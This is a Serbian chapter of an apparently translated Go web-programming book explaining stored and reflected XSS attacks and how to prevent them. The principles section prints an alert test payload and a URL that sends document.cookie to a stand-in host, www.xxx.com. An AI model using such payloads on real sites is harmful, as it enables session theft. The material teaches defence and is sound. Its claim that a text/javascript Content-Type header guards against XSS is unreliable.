# 9.3 XSS napadi

[Sadržaj](_00.0-sr.md)

Sa razvojem internet tehnologije, veb aplikacije su često prepune dinamičkog sadržaja kako bi se poboljšalo korisničko iskustvo. Dinamički sadržaj je sadržaj koji reaguje i menja se u skladu sa zahtevima i radnjama korisnika. Dinamički sajtovi su često podložni napadima međusajtskog skriptovanja (koje stručnjaci za bezbednost često nazivaju skraćenim oblikom, XSS), nešto na šta statički veb sajtovi uopšte ne utiču.

## Šta je XSS

Kao što je već pomenuto, termin XSS je skraćenica za Cross-Site Scripting, što je vrsta napada uobičajena na vebu. Da ne bismo mešali ovaj termin sa drugom uobičajenom veb skraćenicom, CSS (Cascading Style Sheets), koristimo „an“ Xumesto „a“ Cza „cross“ u cross-site scripting. XSS je uobičajena ranjivost veb bezbednosti koja omogućava napadačima da ubrizgavaju zlonamerni kod na veb stranice. Za razliku od većine vrsta napada koji generalno uključuju samo napadača i žrtvu, XSS uključuje tri strane: napadača, klijenta i veb aplikaciju. Cilj XSS napada je krađa kolačića koje veb aplikacije čuvaju na klijentima u svrhu čitanja osetljivih informacija o klijentima. Kada napadač dođe do ovih informacija, može da se predstavlja kao korisnik i da komunicira sa veb stranicama bez njihovog znanja ili odobrenja.

XSS napadi se obično mogu podeliti u dve kategorije: jedna je sačuvani XSS napad. Ovaj oblik napada nastaje kada se korisnicima dozvoli da unose podatke na javnu stranicu, koji će, nakon što ih server sačuva, biti vraćeni (nezaštićeni) drugim korisnicima koji je slučajno pregledaju. Neki primeri tipova stranica koje su često pogođene uključuju komentare, recenzije, objave na blogovima i forume. Proces često ide ovako: napadač unosi neki html kod nakon čega sledi skrivena `<script>` oznaka koja sadrži zlonamerni kod, a zatim klikne na dugme „sačuvaj“. Veb aplikacija čuva ovo u bazi podataka. Kada drugi korisnik zatraži ovu stranicu, aplikacija upituje ove kontaminirane podatke iz baze podataka i služi je korisniku. Skripta napadača zatim izvršava proizvoljni kod na računaru klijenta.

Drugi tip je reflektovani XSS napad. Glavna ideja je da se zlonamerni skript direktno ugradi u parametre upita URL adrese. Server koji odmah analizira ove podatke u stranicu rezultata i vraća je (klijentu koji je podneo zahtev) neočišćenu, može nesvesno prouzrokovati da računar klijenta izvrši ovaj kod. Napadač može poslati korisniku vezu koja izgleda legitimno ka pouzdanoj veb lokaciji sa kodiranim sadržajem; klik na ovu vezu može prouzrokovati da pregledač korisnika izvrši zlonamerni skript.

XSS predstavlja glavna sredstva i ciljeve na sledeći način:

Krađa kolačića, pristup osetljivim informacijama.
Napadač takođe može da koristi ugrađeni Fleš, putem dozvola za više domena, da bi dobio veća korisnička prava. Ovo važi i za druge slične vektore napada kao što su Java i VBScript.

Korišćenje iframe-ova, frejmova, XMLHttpRequest-ova itd. može omogućiti napadaču da preuzme identitet korisnika kako bi obavljao administrativne radnje kao što su mikroblogovanje, dodavanje prijatelja, slanje privatnih poruka i druge rutinske operacije. Pre nekog vremena, platforma za mikroblogovanje Sina je patila od ove vrste XSS ranjivosti.
Kada mnogo korisnika poseti stranicu pogođenu XSS napadom, efekat na neke manje sajtove može biti uporediv sa efektom DDoS napada.

## XSS principi

Veb aplikacije koje vraćaju tražene podatke korisnicima bez prethodne provere i filtriranja mogu omogućiti zlonamernim korisnicima da ubrizgavaju skripte (obično ugrađene unutar HTML-a unutar `<script>` oznaka) u pregledače drugih korisnika. Kada se ovaj zlonamerni kod prikaže u pregledaču korisnika bez prethodnog „bekstva“, pregledač korisnika će interpretirati ovaj kod: ovo je definicija XSS napada, a ova vrsta greške je vodeći uzrok XSS ranjivosti.

Hajde da prođemo kroz proces reflektivnog XSS napada. Recimo da postoji veb lokacija koja prikazuje korisničko ime prema parametrima upita URL-a; pristup sledećem URL-u <http://127.0.0.1/?name=astaxie> će dovesti do toga da server prikazuje sledeće:

```html
hello astaxie
```

Recimo da umesto toga prosledimo sledeći parametar, pristupajući istom URL-u:

```html
http://127.0.0.1/?name=<script>alert('astaxie,xss')</script>
```

Ako ovo uzrokuje da pregledač prikaže iskačući prozor sa upozorenjem, možemo potvrditi da je sajt ranjiv na XSS napade. Pa kako zlonamerni korisnici kradu kolačiće koristeći istu vrstu napada?

Baš kao i ranije, imamo URL:

<http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;>

Klikom na ovu URL adresu, poslali biste trenutni kolačić na navedenu lokaciju: `www.xxx.com`. Možda se pitate, zašto bi iko uopšte kliknuo na tako čudno izgledajuću URL adresu? Iako je istina da će ovakva URL adresa učiniti većinu ljudi skeptičnim, ako bi napadač koristio jednu od mnogih popularnih usluga skraćivanja URL adresa da bi je prikrio, da li biste i dalje mogli da je vidite? Većina napadača bi na ovaj ili onaj način prikrila URL adresu, a vi biste tek nakon što kliknete na nju znali legitimnost veze. Međutim, do ovog trenutka, podaci kolačića će već biti poslati veb lokaciji treće strane, ugrožavajući vaše osetljive informacije. Možete koristiti alate poput Websleuth-a da biste proverili bezbednost svojih veb aplikacija za ove vrste ranjivosti.

Za detaljniju analizu XSS napada, pogledajte članak: "[Sina microblogging XSS event analysis] ( <http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html> )“

## Kako sprečiti XSS

Odgovor je jednostavan: nikada ne verujte korisničkom unosu i uvek filtrirajte sve specijalne znakove u svim ulaznim podacima koje možete primiti. Ovo će eliminisati većinu XSS napada.

Koristite sledeće tehnike za odbranu od XSS napada:

- Filtrirajte specijalne znakove

  Jedan od načina da se izbegne XSS je filtriranje sadržaja koji dostavlja korisnik. Jezik Go pruža neke funkcije filtriranja HTML-a u svom text/templatepaketu, kao što su HTMLEscapeStringi JSEscapeString, da nabrojimo samo neke.
  
- Navedite tip sadržaja u HTTP zaglavljima
  
  ```go
  w.Header().Set("Content-Type","text/javascript")
  ```

  Ovo omogućava klijentskim pregledačima da analiziraju odgovor kao javaskript kod (primenjujući potrebne filtere) umesto da prikazuju sadržaj na neodređen i potencijalno opasan način.

## Rezime

Uvođenje XSS ranjivosti je veoma realna opasnost pri razvoju veb aplikacija. Važno je zapamtiti da se svi podaci filtriraju, posebno pre nego što se pošalju klijentima; ovo je sada dobro uspostavljen način sprečavanja XSS-a.

[Sadržaj](_00.0-sr.md)
